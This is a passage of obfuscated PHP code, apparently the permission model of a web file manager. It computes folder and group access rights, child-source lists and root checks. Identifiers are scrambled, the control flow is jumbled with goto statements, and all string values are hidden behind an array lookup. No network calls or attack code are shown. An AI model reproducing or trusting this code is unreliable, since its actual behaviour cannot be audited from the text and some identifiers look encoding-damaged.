E³¥¯½ÈÌ: $A†„¬ôíºÏ =& $_SERVER[µ…]; $A‹²Œ•¦ô© = Model($A†„¬ôíºÏ[1181])->sourceListInfo($AôáÜôß‰¬, !0); $aôÕ”œ¶¯ô = $this->sourceAuthSelect($AôáÜôß‰¬); goto DÌèãÒÍ¨; f­ÅŸˆ‡Ç: array_multisort($c›“¡¸‹¬¤, SORT_ASC, $BÎ„‰äÉ¥…); return $BÎ„‰äÉ¥…; goto BĞ´µ”äŒã; DÌèãÒÍ¨: $BÎ„‰äÉ¥… = array(); $c›“¡¸‹¬¤ = array(); foreach ($A‹²Œ•¦ô© as $aáÌ­ÔÒèã) { goto DË†ø×â·Æ; eêÂ¹×á›Ò: $eîêœÍÒòù = count(explode($A†„¬ôíºÏ[8], trim($aáÌ­ÔÒèã[$A†„¬ôíºÏ[489]], $A†„¬ôíºÏ[8]))); $c›“¡¸‹¬¤[] = $eîêœÍÒòù + ($aáÌ­ÔÒèã[$A†„¬ôíºÏ[29]] == $A†„¬ôíºÏ[76] ? 0 : 1000); goto D‚ä±îÇ™; Fß›ƒÄ”°: unset($aáÌ­ÔÒèã[$A†„¬ôíºÏ[84]]); $CÙ…Öãºˆá = $aôÕ”œ¶¯ô[$aáÌ­ÔÒèã[$A†„¬ôíºÏ[390]]]; if (!$CÙ…Öãºˆá) { continue; } goto aÑÖÉ¤Î; aÑÖÉ¤Î: $aáÌ­ÔÒèã[$A†„¬ôíºÏ[1841]] = $this->authTargetInfo($CÙ…Öãºˆá); $aáÌ­ÔÒèã[$A†„¬ôíºÏ[489]] = rtrim($aáÌ­ÔÒèã[$A†„¬ôíºÏ[484]], $A†„¬ôíºÏ[8]) . $A†„¬ôíºÏ[8] . ltrim($aáÌ­ÔÒèã[$A†„¬ôíºÏ[489]], $A†„¬ôíºÏ[8]); $BÎ„‰äÉ¥…[] = $aáÌ­ÔÒèã; goto eêÂ¹×á›Ò; DË†ø×â·Æ: unset($aáÌ­ÔÒèã[$A†„¬ôíºÏ[428]]); unset($aáÌ­ÔÒèã[$A†„¬ôíºÏ[426]]); unset($aáÌ­ÔÒèã[$A†„¬ôíºÏ[400]]); goto Fß›ƒÄ”°; D‚ä±îÇ™: } goto f­ÅŸˆ‡Ç; BĞ´µ”äŒã: } private function groupChidldAllRootSource($b®É¥ù¨Ï£) { $eäˆ— ¢ =& $_SERVER[µ…]; $fê‰‚‡ŞÈ¸ = Model($eäˆ— ¢[1842])->groupChildrenAll($b®É¥ù¨Ï£); $bº˜Á¾¶­ = array($eäˆ— ¢[472] => 0, $eäˆ— ¢[478] => array($eäˆ— ¢[7], $fê‰‚‡ŞÈ¸), $eäˆ— ¢[398] => SourceModel::TYPE_GROUP); $B‹ä•†µ = Model($eäˆ— ¢[769])->field($eäˆ— ¢[390])->where($bº˜Á¾¶­)->select(); $B‹ä•†µ = array_to_keyvalue($B‹ä•†µ, $eäˆ— ¢[33], $eäˆ— ¢[390]); return $B‹ä•†µ; } private function authTargetInfo($b‘²¥²¾„ê) { goto dÌö½ë¯¢ˆ; F„ÏÓ§›‰†: $FãèéºÄÅ = 2 << 25; foreach ($b‘²¥²¾„ê as $AÈØÔÖä«®) { goto Bùù¢êÎÂ»; DÊ«Å†¾˜: $A‰¦¯Ã Ë = 0; if ($AÈØÔÖä«®[$aËŠ‘òÔ¼[398]] == SourceModel::TYPE_GROUP) { $A‰¦¯Ã Ë = $FãèéºÄÅ * 2; } if ($AÈØÔÖä«®[$aËŠ‘òÔ¼[398]] == SourceModel::TYPE_USER) { $A‰¦¯Ã Ë = $FãèéºÄÅ; } goto côŒ ‡ô®…; côŒ ‡ô®…: if ($AÈØÔÖä«®[$aËŠ‘òÔ¼[398]] == SourceModel::TYPE_USER && $AÈØÔÖä«®[$aËŠ‘òÔ¼[478]] == $aËŠ‘òÔ¼[491]) { $A‰¦¯Ã Ë = 0; } $Aî¾¶Şªãß[] = $Fœ÷¢Óíö[$aËŠ‘òÔ¼[400]] + $A‰¦¯Ã Ë; goto FÍÇ§™‚­Ğ; Bùù¢êÎÂ»: $Fœ÷¢Óíö = Model($aËŠ‘òÔ¼[1837])->listData($AÈØÔÖä«®[$aËŠ‘òÔ¼[1765]]); if (!$Fœ÷¢Óíö) { continue; } if ($AÈØÔÖä«®[$aËŠ‘òÔ¼[398]] == SourceModel::TYPE_USER) { $D¹¨·“»Ô = Model($aËŠ‘òÔ¼[497])->getInfoSimpleOuter($AÈØÔÖä«®[$aËŠ‘òÔ¼[478]]); if ($D¹¨·“»Ô[$aËŠ‘òÔ¼[1506]] == $aËŠ‘òÔ¼[1062]) { continue; } if ($D¹¨·“»Ô[$aËŠ‘òÔ¼[1506]] == $aËŠ‘òÔ¼[491]) { $D¹¨·“»Ô[$aËŠ‘òÔ¼[28]] = LNG($aËŠ‘òÔ¼[1843]); } } else { $D¹¨·“»Ô = Model($aËŠ‘òÔ¼[480])->getInfoSimple($AÈØÔÖä«®[$aËŠ‘òÔ¼[478]]); } goto d„ì«¢–é¸; d„ì«¢–é¸: if (!$D¹¨·“»Ô) { continue; } $D¹¨·“»Ô[$aËŠ‘òÔ¼[440]] = $Fœ÷¢Óíö; $cŠ¸±ÏÍª²[] = $D¹¨·“»Ô; goto DÊ«Å†¾˜; FÍÇ§™‚­Ğ: } array_multisort($Aî¾¶Şªãß, SORT_DESC, $cŠ¸±ÏÍª²); goto EÂïÜø°áÏ; dÌö½ë¯¢ˆ: $aËŠ‘òÔ¼ =& $_SERVER[µ…]; $cŠ¸±ÏÍª² = array(); $Aî¾¶Şªãß = array(); goto F„ÏÓ§›‰†; EÂïÜø°áÏ: return $cŠ¸±ÏÍª²; goto DÜ¤‚¸–Û³; DÜ¤‚¸–Û³: } public function getAllChildrenByUser($aƒåìóÓ°¸, $BÔ…‰õÁ¼¸) { goto eéŠîŠŒâ; bÈóŒùœ: foreach ($F“¾ÂâæÛ as $C©áİ³£œİ) { $b•È„²îÇ§ = !1; foreach ($C©áİ³£œİ[$fáôñÚÛë¡[1841]] as $B¯Ñ°îê‰ñ) { if ($B¯Ñ°îê‰ñ[$fáôñÚÛë¡[1506]]) { if ($B¯Ñ°îê‰ñ[$fáôñÚÛë¡[1506]] == $BÔ…‰õÁ¼¸) { $b•È„²îÇ§ = !0; break; } } if ($B¯Ñ°îê‰ñ[$fáôñÚÛë¡[1669]]) { if ($this->groupContainUser($B¯Ñ°îê‰ñ[$fáôñÚÛë¡[1669]], $BÔ…‰õÁ¼¸)) { $b•È„²îÇ§ = !0; break; } } } if ($b•È„²îÇ§) { $CÚæÑùØ¨£[] = $C©áİ³£œİ; } $aÄ®õ¡© = $C©áİ³£œİ[$fáôñÚÛë¡[390]]; if (isset($b¾´‰’¨ÆË[$aÄ®õ¡©])) { $C©áİ³£œİ[$fáôñÚÛë¡[1841]][] = $b¾´‰’¨ÆË[$aÄ®õ¡©][0]; $b¾´‰’¨ÆË[$aÄ®õ¡©] = !1; } } $b¾´‰’¨ÆË = array_filter(array_values($b¾´‰’¨ÆË)); $CÚæÑùØ¨£ = array_merge($b¾´‰’¨ÆË, $CÚæÑùØ¨£); goto bë…´›; B’³ä‹ÏÎä: if ($cÂÇ®Í¢[$fáôñÚÛë¡[472]] == $fáôñÚÛë¡[491] && $cÂÇ®Í¢[$fáôñÚÛë¡[478]] != $b§õèˆœæ¯ && $this->groupContainUser($cÂÇ®Í¢[$fáôñÚÛë¡[478]], $BÔ…‰õÁ¼¸)) { foreach ($E©ò‚¹“È†[$fáôñÚÛë¡[1844]] as $D•Ÿì‡‰·Ğ) { $AÀÊ «¦³ñ = Model($fáôñÚÛë¡[480])->getInfo($D•Ÿì‡‰·Ğ[$fáôñÚÛë¡[1669]]); $b§äå°¼Ñ‹ = Model($fáôñÚÛë¡[501])->getInfoSimpleOuter($BÔ…‰õÁ¼¸); $b§äå°¼Ñ‹[$fáôñÚÛë¡[440]] = $D•Ÿì‡‰·Ğ[$fáôñÚÛë¡[400]]; if (Model($fáôñÚÛë¡[1837])->authCheckAction($D•Ÿì‡‰·Ğ[$fáôñÚÛë¡[400]][$fáôñÚÛë¡[400]], $fáôñÚÛë¡[1689])) { continue; } $Fí£™‡ÀÙ = array($fáôñÚÛë¡[28] => $fáôñÚÛë¡[1458] . $AÀÊ «¦³ñ[$fáôñÚÛë¡[28]], $fáôñÚÛë¡[390] => $AÀÊ «¦³ñ[$fáôñÚÛë¡[84]][$fáôñÚÛë¡[390]], $fáôñÚÛë¡[75] => KodIO::make($AÀÊ «¦³ñ[$fáôñÚÛë¡[84]][$fáôñÚÛë¡[390]]), $fáôñÚÛë¡[472] => $fáôñÚÛë¡[491], $fáôñÚÛë¡[398] => $fáôñÚÛë¡[993], $fáôñÚÛë¡[29] => $fáôñÚÛë¡[512], $fáôñÚÛë¡[489] => $AÀÊ «¦³ñ[$fáôñÚÛë¡[485]], $fáôñÚÛë¡[1669] => $AÀÊ «¦³ñ[$fáôñÚÛë¡[1669]], $fáôñÚÛë¡[482] => $AÀÊ «¦³ñ[$fáôñÚÛë¡[472]], $fáôñÚÛë¡[1841] => array($b§äå°¼Ñ‹)); $b¾´‰’¨ÆË[$Fí£™‡ÀÙ[$fáôñÚÛë¡[390]]] = $Fí£™‡ÀÙ; } } $CÚæÑùØ¨£ = array(); $F“¾ÂâæÛ = $this->getAllChildren($aƒåìóÓ°¸); goto bÈóŒùœ; eéŠîŠŒâ: $fáôñÚÛë¡ =& $_SERVER[µ…]; $E©ò‚¹“È† = Model($fáôñÚÛë¡[501])->getInfo($BÔ…‰õÁ¼¸); if (!$BÔ…‰õÁ¼¸ || !$aƒåìóÓ°¸ || !$E©ò‚¹“È†) { return array(); } goto C©‹¸Ñ¤íî; bë…´›: return $CÚæÑùØ¨£; goto D”‚™ÃŒÓ; C©‹¸Ñ¤íî: $cÂÇ®Í¢ = Model($fáôñÚÛë¡[1181])->sourceInfo($aƒåìóÓ°¸); $b¾´‰’¨ÆË = array(); $b§õèˆœæ¯ = 1; goto B’³ä‹ÏÎä; D”‚™ÃŒÓ: } public function setAllChildrenByUser($d íŸÕôİ, $a…²¥¬¦Ç‚, $fî½¸¢) { $a·ç½äâ‡Œ =& $_SERVER[µ…]; $AÚ„¤øÈÎ = $this->getAllChildrenByUser($d íŸÕôİ, $a…²¥¬¦Ç‚); if (!$fî½¸¢ || !$AÚ„¤øÈÎ) { return !1; } foreach ($AÚ„¤øÈÎ as $fŠ«ì½ó§¤) { $eåìÇÉ«Œ = array(); foreach ($fŠ«ì½ó§¤[$a·ç½äâ‡Œ[1841]] as $dØ¥†òœìö) { $eš˜­ñìÚğ = $dØ¥†òœìö[$a·ç½äâ‡Œ[440]]; $F§§¨—ğØµ = $dØ¥†òœìö[$a·ç½äâ‡Œ[1506]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $dÇ†«Ö®Éä = $dØ¥†òœìö[$a·ç½äâ‡Œ[1506]] ? $dØ¥†òœìö[$a·ç½äâ‡Œ[1506]] : $dØ¥†òœìö[$a·ç½äâ‡Œ[1669]]; if ($dØ¥†òœìö[$a·ç½äâ‡Œ[1506]] && $dØ¥†òœìö[$a·ç½äâ‡Œ[1506]] == $a…²¥¬¦Ç‚) { continue; } $eåìÇÉ«Œ[] = array($a·ç½äâ‡Œ[390] => $fŠ«ì½ó§¤[$a·ç½äâ‡Œ[390]], $a·ç½äâ‡Œ[398] => $F§§¨—ğØµ, $a·ç½äâ‡Œ[478] => intval($dÇ†«Ö®Éä), $a·ç½äâ‡Œ[1765] => isset($eš˜­ñìÚğ[$a·ç½äâ‡Œ[388]]) ? intval($eš˜­ñìÚğ[$a·ç½äâ‡Œ[388]]) : 0, $a·ç½äâ‡Œ[1819] => isset($eš˜­ñìÚğ[$a·ç½äâ‡Œ[1819]]) ? intval($eš˜­ñìÚğ[$a·ç½äâ‡Œ[1819]]) : -1); } $eåìÇÉ«Œ[] = array($a·ç½äâ‡Œ[390] => $fŠ«ì½ó§¤[$a·ç½äâ‡Œ[390]], $a·ç½äâ‡Œ[398] => SourceModel::TYPE_USER, $a·ç½äâ‡Œ[478] => intval($a…²¥¬¦Ç‚), $a·ç½äâ‡Œ[1765] => intval($fî½¸¢), $a·ç½äâ‡Œ[1819] => -1); $this->where(array($a·ç½äâ‡Œ[404] => $fŠ«ì½ó§¤[$a·ç½äâ‡Œ[390]]))->delete(); $this->addAll($eåìÇÉ«Œ); } return !0; } public function get($fªßâ¥Šòá) { $bÜ’ªÜÍÒä = $this->getSourceList(array($fªßâ¥Šòá), !0); return $bÜ’ªÜÍÒä[0]; } public function getSourceList($A¼ĞÕ„Ú¶, $bÏ¹ƒÑÍÅ´ = false, $Bš‚Œ‹±÷” = false) { goto Eï”Ü¼’·˜; bŒÔ°ğĞØ: $E‡¥Ÿá‚È = array(); foreach ($bÏ¹ƒÑÍÅ´ as $c„æ­Ì’ => $C¶óŠ’éé™) { if ($E‰Ö§‰”ù²) { $E‡¥Ÿá‚È[$c„æ­Ì’] = $FÂ©’â÷ÙŞ; continue; } $E‡¥Ÿá‚È[$c„æ­Ì’] = $this->makeSourceAuth($C¶óŠ’éé™, $dÜ¾Û‘±†Ë, $Bš‚Œ‹±÷”); } return $E‡¥Ÿá‚È; goto d³Ñæ¦ƒî›; Eï”Ü¼’·˜: $dŞ¡¯Ë›¢Ö =& $_SERVER[µ…]; if (!$A¼ĞÕ„Ú¶) { return array(); } $cÈ“â˜ï²Ğ = Model($dŞ¡¯Ë›¢Ö[1181]); goto cè¬š‘óÓ; cè¬š‘óÓ: if (!$bÏ¹ƒÑÍÅ´ && count($A¼ĞÕ„Ú¶) == 1) { $bÏ¹ƒÑÍÅ´ = array(); $bÏ¹ƒÑÍÅ´[$A¼ĞÕ„Ú¶[0]] = $cÈ“â˜ï²Ğ->sourceInfo($A¼ĞÕ„Ú¶[0]); } if (!$bÏ¹ƒÑÍÅ´) { $aÓÅƒÓŠŠ“ = array($dŞ¡¯Ë›¢Ö[404] => array($dŞ¡¯Ë›¢Ö[405], $A¼ĞÕ„Ú¶)); $bÏ¹ƒÑÍÅ´ = $cÈ“â˜ï²Ğ->field($dŞ¡¯Ë›¢Ö[1845])->where($aÓÅƒÓŠŠ“)->select(); $bÏ¹ƒÑÍÅ´ = array_to_keyvalue($bÏ¹ƒÑÍÅ´, $dŞ¡¯Ë›¢Ö[390]); } $Fğæ Î¨Åê = $A¼ĞÕ„Ú¶; goto b‰Ö—¿¨èğ; b‰Ö—¿¨èğ: foreach ($bÏ¹ƒÑÍÅ´ as $dØëí¼Ö˜Ï => $f Æ¾§Í‰) { $D»”íºâàá = $cÈ“â˜ï²Ğ->parentLevelArray($f Æ¾§Í‰[$dŞ¡¯Ë›¢Ö[481]]); $Fğæ Î¨Åê = array_merge($Fğæ Î¨Åê, array($dØëí¼Ö˜Ï), array_reverse($D»”íºâàá)); } $Fğæ Î¨Åê = array_values(array_unique($Fğæ Î¨Åê)); if (!$Fğæ Î¨Åê) { return array(); } goto C•×ƒ³ àô; C•×ƒ³ àô: $FˆñªÁº‘¶ = $this->sourceAuthSelect($Fğæ Î¨Åê); $dÜ¾Û‘±†Ë = array(); foreach ($Fğæ Î¨Åê as $c„æ­Ì’) { if (isset($FˆñªÁº‘¶[$c„æ­Ì’])) { $dÜ¾Û‘±†Ë[$c„æ­Ì’] = $FˆñªÁº‘¶[$c„æ­Ì’]; } } goto bìĞÇÚ¤»º; bìĞÇÚ¤»º: $E‰Ö§‰”ù² = $this->userIsRoot($Bš‚Œ‹±÷”); $D„í¹•¢¨á = AuthModel::authAll(); $FÂ©’â÷ÙŞ = array($dŞ¡¯Ë›¢Ö[401] => $D„í¹•¢¨á, $dŞ¡¯Ë›¢Ö[1846] => array($dŞ¡¯Ë›¢Ö[406] => 0, $dŞ¡¯Ë›¢Ö[1675] => $D„í¹•¢¨á, $dŞ¡¯Ë›¢Ö[407] => LNG($dŞ¡¯Ë›¢Ö[1847]), $dŞ¡¯Ë›¢Ö[1690] => $dŞ¡¯Ë›¢Ö[1848])); goto bŒÔ°ğĞØ; d³Ñæ¦ƒî›: } public function authDeepCheck($ağï‡œÈ£‚, $cÛ•ÒÁÆÖ = false) { goto A‚ŞöòÇÖè; A‚ŞöòÇÖè: $cÛÑãåï¤Æ =& $_SERVER[µ…]; $cÛ•ÒÁÆÖ = $cÛ•ÒÁÆÖ ? $cÛ•ÒÁÆÖ : USER_ID; $dÕñŸ±¿¶† = $this->makeAuthDeep($cÛ•ÒÁÆÖ); goto dÈÛ„¿; dîåãƒ–çÜ: if (!$EÔµ•ïôÌ…) { return !1; } $AöçªŒÖ—Á = $EÔµ•ïôÌ… ? $EÔµ•ïôÌ…[0] : $ağï‡œÈ£‚; return array($cÛÑãåï¤Æ[401] => -1, $cÛÑãåï¤Æ[440] => array($cÛÑãåï¤Æ[406] => $cÛÑãåï¤Æ[1062], $cÛÑãåï¤Æ[1675] => $cÛÑãåï¤Æ[491], $cÛÑãåï¤Æ[407] => LNG($cÛÑãåï¤Æ[1851]), $cÛÑãåï¤Æ[1690] => $cÛÑãåï¤Æ[1852]), $cÛÑãåï¤Æ[1853] => LNG($cÛÑãåï¤Æ[1854]), $cÛÑãåï¤Æ[1855] => $this->sourceAuthInfo($AöçªŒÖ—Á)); goto F–ë‹©˜‡¡; dÈÛ„¿: if (!in_array($ağï‡œÈ£‚, $dÕñŸ±¿¶†[$cÛÑãåï¤Æ[1849]])) { return !1; } $EÔµ•ïôÌ… = array(); foreach ($dÕñŸ±¿¶†[$cÛÑãåï¤Æ[1850]] as $a—îçšŒŞŒ => $FÙ·ÒôÉõ) { if (!in_array($ağï‡œÈ£‚, $FÙ·ÒôÉõ)) { continue; } $EÔµ•ïôÌ…[] = $a—îçšŒŞŒ; } goto dîåãƒ–çÜ; F–ë‹©˜‡¡: } protected function makeAuthDeep($CÚ•ŠïéĞè = false) { goto aÂĞÒœ´çê; A°ìòÕ¸Å‹: $f‡ŞÀ©Ú = array(); if ($fğè“œ…Ñ) { $B‰×îìœõ‰ = $Còé¬Ê¾->where(array($bù¾¿½óñô[390] => array($bù¾¿½óñô[405], $fğè“œ…Ñ)))->select(); foreach ($B‰×îìœõ‰ as $e›ø‰ƒ¢÷˜) { $F§×Ç…å“­ = $Còé¬Ê¾->parentLevelArray($e›ø‰ƒ¢÷˜[$bù¾¿½óñô[481]]); $B¦¼­Î´£ª = array_merge($B¦¼­Î´£ª, $F§×Ç…å“­); $A¦£±±¯[] = $e›ø‰ƒ¢÷˜[$bù¾¿½óñô[478]]; $CÏ‰ÅÉ¾†‰[$e›ø‰ƒ¢÷˜[$bù¾¿½óñô[390]]] = $F§×Ç…å“­; $eÄİ¢´æ¸³[$e›ø‰ƒ¢÷˜[$bù¾¿½óñô[390]]] = $e›ø‰ƒ¢÷˜[$bù¾¿½óñô[478]]; } } $A¦£±±¯ = array_values(array_unique($A¦£±±¯)); goto Eñˆäâ¶––; AÆœäºçã: $CÏ‰ÅÉ¾†‰ = array(); $eÄİ¢´æ¸³ = array(); $EØÄ¯“³µ° = array(); goto A°ìòÕ¸Å‹; C¾æµëë»: if (isset($D¸º¤“ƒ²ç[$CÚ•ŠïéĞè])) { return $D¸º¤“ƒ²ç[$CÚ•ŠïéĞè]; } $d‘õ›¸Ò‰Á = Model($bù¾¿½óñô[1856])->listData(); $F¨Ñ¼Š¾ÇÒ = array(); goto D«î©µæ•›; e÷—ë„Ğ: $d˜’»äàÕ = array($bù¾¿½óñô[1849] => $B¦¼­Î´£ª, $bù¾¿½óñô[1850] => $CÏ‰ÅÉ¾†‰); $D¸º¤“ƒ²ç[$CÚ•ŠïéĞè] = $d˜’»äàÕ; return $d˜’»äàÕ; goto C‘ÓÜ¸Ê‘; aÂĞÒœ´çê: $bù¾¿½óñô =& $_SERVER[µ…]; static $D¸º¤“ƒ²ç = array(); $CÚ•ŠïéĞè = $CÚ•ŠïéĞè ? $CÚ•ŠïéĞè : USER_ID; goto C¾æµëë»; D«î©µæ•›: foreach ($d‘õ›¸Ò‰Á as $AË‰»¼¥ì) { if ($AË‰»¼¥ì[$bù¾¿½óñô[400]] == 0 && $AË‰»¼¥ì[$bù¾¿½óñô[1691]] == $bù¾¿½óñô[86]) { $F¨Ñ¼Š¾ÇÒ[] = $AË‰»¼¥ì[$bù¾¿½óñô[388]]; } } $DÇ©´Â¼Â = $this->userGroupParents($CÚ•ŠïéĞè); $bÅ¯¯öî = array($bù¾¿½óñô[398] => SourceModel::TYPE_USER, $bù¾¿½óñô[478] => $CÚ•ŠïéĞè); goto aØÒ¢œˆŸ; eÉÖĞŠÃÑ: $cÜÛ³ÔÁå = array_to_keyvalue_group($a“µíª®»¸, $bù¾¿½óñô[390]); foreach ($cÜÛ³ÔÁå as $B³¾øòƒ’Ÿ => $aª‹”áªÉ) { $bí÷ñ‹µÉÆ = $this->authArrayCheck($aª‹”áªÉ, $CÚ•ŠïéĞè); if ($bí÷ñ‹µÉÆ[$bù¾¿½óñô[401]] > 0) { $fğè“œ…Ñ[] = $B³¾øòƒ’Ÿ . $bù¾¿½óñô[33]; } } $B¦¼­Î´£ª = array(); goto fŞÍİ¾ÇÒ; Eñˆäâ¶––: $a¥¤«¼¶ = $A¦£±±¯; foreach ($a¥¤«¼¶ as $f†Ø«ØÚ…) { $CŸé÷‹­˜¤ = $AÛ¢Á¼Íƒï->getInfo($f†Ø«ØÚ…); $F§×Ç…å“­ = $Còé¬Ê¾->parentLevelArray($CŸé÷‹­˜¤[$bù¾¿½óñô[481]]); $A¦£±±¯ = array_merge($A¦£±±¯, $F§×Ç…å“­); } $A¦£±±¯ = array_values(array_unique($A¦£±±¯)); goto CËòÍò¿¬å; aØÒ¢œˆŸ: if ($DÇ©´Â¼Â) { $bÅ¯¯öî = array(array($bù¾¿½óñô[398] => SourceModel::TYPE_USER, $bù¾¿½óñô[478] => $CÚ•ŠïéĞè), array($bù¾¿½óñô[398] => SourceModel::TYPE_GROUP, $bù¾¿½óñô[478] => array($bù¾¿½óñô[405], $DÇ©´Â¼Â)), $bù¾¿½óñô[935] => $bù¾¿½óñô[1757]); } $a“µíª®»¸ = $this->field($bù¾¿½óñô[1857])->where($bÅ¯¯öî)->select(); $fğè“œ…Ñ = array(); goto eÉÖĞŠÃÑ; CËòÍò¿¬å: foreach ($A¦£±±¯ as $f†Ø«ØÚ…) { $CŸé÷‹­˜¤ = $AÛ¢Á¼Íƒï->getInfo($f†Ø«ØÚ…); $B¦¼­Î´£ª[] = $CŸé÷‹­˜¤[$bù¾¿½óñô[84]][$bù¾¿½óñô[390]]; $EØÄ¯“³µ°[$f†Ø«ØÚ…] = $CŸé÷‹­˜¤[$bù¾¿½óñô[84]][$bù¾¿½óñô[390]]; $f‡ŞÀ©Ú[$f†Ø«ØÚ…] = $Còé¬Ê¾->parentLevelArray($CŸé÷‹­˜¤[$bù¾¿½óñô[481]]); } foreach ($CÏ‰ÅÉ¾†‰ as $câÊ„ß÷œš => $dĞ«ÁÉ·çõ) { $C³˜˜¢“³é = $eÄİ¢´æ¸³[$câÊ„ß÷œš]; if (!$C³˜˜¢“³é || !$EØÄ¯“³µ°[$C³˜˜¢“³é]) { continue; } $Fğ‚Õ‚†Œ = array(); foreach ($f‡ŞÀ©Ú[$C³˜˜¢“³é] as $f†Ø«ØÚ…) { $Fğ‚Õ‚†Œ[] = $EØÄ¯“³µ°[$f†Ø«ØÚ…]; } $CÏ‰ÅÉ¾†‰[$câÊ„ß÷œš] = array_merge($Fğ‚Õ‚†Œ, $dĞ«ÁÉ·çõ); } $B¦¼­Î´£ª = array_values(array_unique($B¦¼­Î´£ª)); goto e÷—ë„Ğ; fŞÍİ¾ÇÒ: $A¦£±±¯ = $DÇ©´Â¼Â; $Còé¬Ê¾ = Model($bù¾¿½óñô[1181]); $AÛ¢Á¼Íƒï = Model($bù¾¿½óñô[480]); goto AÆœäºçã; C‘ÓÜ¸Ê‘: } private function makeSourceAuth($C…ÔØ×Ç‘Ú, $FÛÔì á±, $aç¢”·‚÷Á = false) { goto AÊÍµøŠ; AÊÍµøŠ: $dŠäœÃà¯Ú =& $_SERVER[µ…]; $fô©ÎÏñ‚Ú = $dŠäœÃà¯Ú[86]; $c†íö†‡ = $C…ÔØ×Ç‘Ú[$dŠäœÃà¯Ú[478]]; goto dŠ‰ñ²¼½´; BÖ†’İ‹é: if (!$a£À¡‰ã¡®) { $f¨­ˆÊ¡‰¿ = Model($dŠäœÃà¯Ú[480])->getInfo($c†íö†‡); $C•Öç©Ù©Û = explode($dŠäœÃà¯Ú[47], trim($f¨­ˆÊ¡‰¿[$dŠäœÃà¯Ú[481]], $dŠäœÃà¯Ú[47])); $C•Öç©Ù©Û = array_reverse($C•Öç©Ù©Û); foreach ($C•Öç©Ù©Û as $F¯¾«¬°) { if ($F¯¾«¬° == $dŠäœÃà¯Ú[491] || $F¯¾«¬° == $fô©ÎÏñ‚Ú) { continue; } $dÏŒÈÍÉİê = $this->groupRootAuth($F¯¾«¬°, $aç¢”·‚÷Á); if (!$dÏŒÈÍÉİê) { continue; } $a£À¡‰ã¡® = $this->groupAuthInfo($dÏŒÈÍÉİê, $F¯¾«¬°); break; } } if (!$a£À¡‰ã¡® || $a£À¡‰ã¡®[$dŠäœÃà¯Ú[401]] <= 0) { $dÁÔàèÉÖó = $this->authDeepCheck($C…ÔØ×Ç‘Ú[$dŠäœÃà¯Ú[390]], $aç¢”·‚÷Á); if ($dÁÔàèÉÖó) { $a£À¡‰ã¡® = $dÁÔàèÉÖó; } } return $a£À¡‰ã¡®; goto a‘–½»¸â; cÖë…ÖÊš‘: $f×„éÍƒ˜¬ = Model($dŠäœÃà¯Ú[1181])->parentLevelArray($C…ÔØ×Ç‘Ú[$dŠäœÃà¯Ú[481]]); $f×„éÍƒ˜¬ = array_merge(array($C…ÔØ×Ç‘Ú[$dŠäœÃà¯Ú[390]]), array_reverse($f×„éÍƒ˜¬)); $a£À¡‰ã¡® = !1; goto d±‚éİ‚Áä; dŠ‰ñ²¼½´: $fÇáŠªÙ© = $C…ÔØ×Ç‘Ú[$dŠäœÃà¯Ú[398]] == SourceModel::TYPE_GROUP; $c¢ğ’šŒ• = $fÇáŠªÙ© ? $this->groupRootAuth($c†íö†‡, $aç¢”·‚÷Á) : !1; if ($c¢ğ’šŒ• && Model($dŠäœÃà¯Ú[1837])->authCheckAction($c¢ğ’šŒ•[$dŠäœÃà¯Ú[400]], $dŠäœÃà¯Ú[1689])) { return $this->groupAuthInfo($c¢ğ’šŒ•, $c†íö†‡); } goto cÖë…ÖÊš‘; d±‚éİ‚Áä: foreach ($f×„éÍƒ˜¬ as $a‘Íªêù£†) { if (!isset($FÛÔì á±[$a‘Íªêù£†])) { continue; } $Fïšƒ£Š‡ = $this->authMake($FÛÔì á±[$a‘Íªêù£†], $aç¢”·‚÷Á); if ($Fïšƒ£Š‡[$dŠäœÃà¯Ú[440]]) { $a£À¡‰ã¡® = $Fïšƒ£Š‡; break; } } if (!$fÇáŠªÙ©) { return $a£À¡‰ã¡®; } if (!$a£À¡‰ã¡® && $c¢ğ’šŒ•) { $a£À¡‰ã¡® = $this->groupAuthInfo($c¢ğ’šŒ•, $c†íö†‡); } goto BÖ†’İ‹é; a‘–½»¸â: } private function userIsRoot($bÏ×¹°›îµ = false) { $e¸öŸî—¦Ö =& $_SERVER[µ…]; if (!$bÏ×¹°›îµ && _get($GLOBALS, $e¸öŸî—¦Ö[479])) { return !0; } $A±ÄË÷â³ñ = Model($e¸öŸî—¦Ö[501])->getInfo($bÏ×¹°›îµ); $e¹¬ŠÂèŞö = Model($e¸öŸî—¦Ö[1858])->listData($A±ÄË÷â³ñ[$e¸öŸî—¦Ö[1390]]); if ($e¹¬ŠÂèŞö && $e¹¬ŠÂèŞö[$e¸öŸî—¦Ö[1261]][$e¸öŸî—¦Ö[1859]] == 1) { return !0; } return !1; } private function sourceAuthInfo($aºŒ†Š²·) { goto b¥Å¥Âíèä; b¥Å¥Âíèä: $c¡è‡øô‡î =& $_SERVER[µ…]; $cçÓ¸á¹ÔÜ = Model($c¡è‡øô‡î[1181]); $aÚ—Â„†²ª = $cçÓ¸á¹ÔÜ->sourceInfo($aºŒ†Š²·); goto dŠ¯Üœµ•»; bâáª„¶ñÂ: $B£„ˆæŒ”ª = $cçÓ¸á¹ÔÜ->_listAppendPath($B£„ˆæŒ”ª); $aÚ—Â„†²ª = $B£„ˆæŒ”ª[0]; $D²®§‹å­å = $aÚ—Â„†²ª[$c¡è‡øô‡î[489]]; goto B»®Ó â’î; B»®Ó â’î: if (isset($aÚ—Â„†²ª[$c¡è‡øô‡î[486]])) { $E‚óËçä¥å = explode($c¡è‡øô‡î[8], trim($aÚ—Â„†²ª[$c¡è‡øô‡î[489]], $c¡è‡øô‡î[8])); array_shift($E‚óËçä¥å); $D²®§‹å­å = $aÚ—Â„†²ª[$c¡è‡øô‡î[484]] . $c¡è‡øô‡î[1860] . implode($c¡è‡øô‡î[8], $E‚óËçä¥å); } return array($c¡è‡øô‡î[407] => $aÚ—Â„†²ª[$c¡è‡øô‡î[28]], $c¡è‡øô‡î[75] => KodIO::make($aÚ—Â„†²ª[$c¡è‡øô‡î[390]]), $c¡è‡øô‡î[1861] => $D²®§‹å­å); goto C”ĞÉªŸâ; dŠ¯Üœµ•»: if (!$aÚ—Â„†²ª) { return !1; } $cçÓ¸á¹ÔÜ->groupPathDisplay($aÚ—Â„†²ª); $B£„ˆæŒ”ª = array($aÚ—Â„†²ª); goto bâáª„¶ñÂ; C”ĞÉªŸâ: } private function groupAuthInfo($C¸£äÛ·è‚, $d²ˆ¬¶ë‚) { $b½ëÒæÊÇ™ =& $_SERVER[µ…]; $cØ•á˜Ë = 